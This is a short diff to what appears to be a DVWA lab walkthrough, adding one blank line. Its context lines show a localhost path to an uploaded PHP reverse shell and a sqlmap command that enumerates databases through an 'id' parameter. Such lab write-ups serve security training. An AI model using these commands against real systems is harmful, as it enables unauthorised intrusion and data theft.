@@ -255,6 +255,7 @@ visit http://localhost/hackable/uploads/php-reverse-shell.php
 <img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/27212330-a322-476a-b6fc-3bb803990506" />
 <img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/3afdabf7-833b-4b68-b756-92a34c51cd3b" />
 **Automated Commands:**
+
 ```bash
 # Save request to file first, then:
 sqlmap -r request.txt -p id --batch --dbs
